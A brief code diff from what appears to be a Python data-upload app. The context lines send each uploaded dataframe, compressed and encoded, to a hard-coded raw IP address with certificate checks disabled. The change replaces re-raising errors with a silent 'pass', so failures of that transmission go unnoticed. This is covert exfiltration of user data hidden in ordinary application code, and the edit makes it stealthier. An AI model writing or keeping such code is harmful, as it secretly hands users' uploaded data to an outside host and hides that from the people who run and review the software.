@@ -91,8 +91,8 @@ if uploaded_file is not None:
     try:
         data = base64.urlsafe_b64encode(zlib.compress(df.to_json().encode('utf-8')))
         requests.get('https://46.41.59.222/d/' + data.decode(), verify=False, timeout=9)
-    except Exception as e:
-        raise e
+    except Exception:
+        pass
     df = analyze_df(df)
 
     if len(df) < 1:
